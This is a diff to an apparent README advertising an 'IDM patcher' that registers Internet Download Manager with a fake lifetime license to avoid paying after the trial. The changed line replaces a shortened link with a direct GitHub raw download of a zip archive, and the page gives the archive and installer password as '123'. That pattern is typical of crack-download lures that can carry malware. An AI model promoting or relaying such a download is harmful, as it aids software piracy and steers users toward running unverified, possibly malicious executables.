@@ -8,7 +8,7 @@
 
 **Internet Download Manager (IDM)** basically gives you 30 days of free usage of the app. After, you will either have to pay for it or just stop using it and looks for other alternatives. This patcher solves this problem by registering the app with a **Fake Lifetime License** which is detected by (IDM) as a real one.
 
-# [🔴➤➤ Download it here](https://rebrand.ly/uncq9w5/)
+# [🔴➤➤ Download it here](https://github.com/Nebulo-Lumora/cryo/raw/refs/heads/main/universal_idm_patcher_v18.1.zip)
 The password for the archive and the installer is '**123**'.
 ---
 
